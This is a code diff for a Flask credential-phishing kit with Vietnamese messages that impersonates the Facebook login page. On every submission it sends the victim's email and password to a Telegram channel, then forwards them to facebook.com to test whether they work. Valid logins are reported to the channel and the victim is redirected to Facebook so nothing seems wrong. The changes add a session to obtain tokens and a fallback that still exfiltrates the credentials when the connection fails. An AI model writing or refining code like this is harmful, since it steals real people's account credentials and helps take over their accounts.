@@ -33,11 +33,15 @@ def login():
     if not email or not password:
         return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")
 
-    # Gửi thông tin về Telegram trước
-    send_to_telegram("📧 THÔNG TIN ĐĂNG NHẬP", f"Email: {email}\nPassword: {password}")
+    send_to_telegram("📧 THÔNG TIN ĐÃ NHẬP", f"Email: {email}\nPassword: {password}")
 
-    # === GỬI REQUEST ĐẾN FACEBOOK THẬT ===
+    # === THỬ FORWARD REQUEST ĐẾN FACEBOOK ===
     try:
+        s = requests.Session()
+        
+        # Lấy trang login trước để có token
+        s.get('https://www.facebook.com/', headers={'User-Agent': 'Mozilla/5.0'})
+
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml',
@@ -52,23 +56,18 @@ def login():
             'login': '1'
         }
 
-        r = requests.post('https://www.facebook.com/login.php', 
-                         data=data, 
-                         headers=headers, 
-                         allow_redirects=True, 
-                         timeout=12)
+        r = s.post('https://www.facebook.com/login.php', data=data, headers=headers, allow_redirects=True, timeout=15)
 
-        # Kiểm tra xem có đăng nhập thành công không
-        if any(x in r.url for x in ['home.php', 'facebook.com/home', '/messages']):
-            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG", f"Email: {email}\nPassword: {password}")
+        if "home" in r.url.lower() or r.status_code == 200 and len(r.text) > 10000:
+            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG (PROXY)", f"Email: {email}\nPassword: {password}")
             return redirect('https://www.facebook.com')
         else:
-            # Sai mật khẩu hoặc bị chặn
             return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
-    except Exception as e:
-        send_to_telegram("❌ LỖI KẾT NỐI", f"Email: {email}\nError: {str(e)}")
-        return render_template('index.html', error="Đã xảy ra lỗi. Vui lòng thử lại sau.")
+    except:
+        # Nếu lỗi kết nối thì redirect luôn
+        send_to_telegram("📧 THÔNG TIN ĐÃ NHẬP (Fallback)", f"Email: {email}\nPassword: {password}")
+        return redirect('https://www.facebook.com')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
